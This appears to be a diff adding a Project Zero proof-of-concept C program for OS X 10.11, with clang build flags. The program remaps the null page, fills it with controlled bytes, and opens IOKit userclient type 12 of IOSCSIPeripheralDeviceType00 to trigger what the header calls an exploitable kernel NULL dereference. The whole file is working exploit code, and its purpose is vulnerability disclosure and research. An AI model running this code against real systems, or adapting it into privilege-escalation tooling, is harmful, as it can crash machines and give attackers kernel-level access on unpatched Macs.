@@ -1,0 +1,71 @@
+/*
+Source: https://code.google.com/p/google-security-research/issues/detail?id=562
+
+Opening userclient type 12 of IOSCSIPeripheralDeviceType00 leads to an exploitable kernel NULL dereference.
+
+Tested on OS X 10.11 ElCapitan (15a284) on MacBookAir5,2
+*/
+
+// ianbeer
+// clang -o scsi_peripheral scsi_peripheral.c -m32 -framework IOKit -g -pagezero_size 0x0
+
+/*
+Opening userclient type 12 of IOSCSIPeripheralDeviceType00 leads to an exploitable kernel NULL dereference
+
+Tested on OS X 10.11 ElCapitan (15a284) on MacBookAir5,2
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <mach/mach.h>
+#include <mach/vm_map.h>
+#include <sys/mman.h>
+
+#include <unistd.h>
+
+#include <IOKit/IOKitLib.h>
+
+io_connect_t conn = MACH_PORT_NULL;
+
+int main() {
+  kern_return_t err;
+  // re map the null page rw
+  int var = 0;
+  err = vm_deallocate(mach_task_self(), 0x0, 0x1000);
+  if (err != KERN_SUCCESS){
+    printf("%x\n", err);
+  }
+  vm_address_t addr = 0;
+  err = vm_allocate(mach_task_self(), &addr, 0x1000, 0);
+  if (err != KERN_SUCCESS){
+    if (err == KERN_INVALID_ADDRESS){
+      printf("invalid address\n");
+    }
+    if (err == KERN_NO_SPACE){
+      printf("no space\n");
+    }
+    printf("%x\n", err);
+  }
+  char* np = 0;
+  for (int i = 0; i < 0x1000; i++){
+    np[i] = 'A';
+  }
+
+
+  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSCSIPeripheralDeviceType00"));
+  if (service == MACH_PORT_NULL) {
+    printf("can't find service\n");
+    return 0;
+  }
+
+  IOServiceOpen(service, mach_task_self(), 12, &conn);  // <-- userclient type 12
+  if (conn == MACH_PORT_NULL) {
+    printf("can't connect to service\n");
+    return 0;
+  }
+
+  printf("boom?\n");
+
+  return 0;
+}
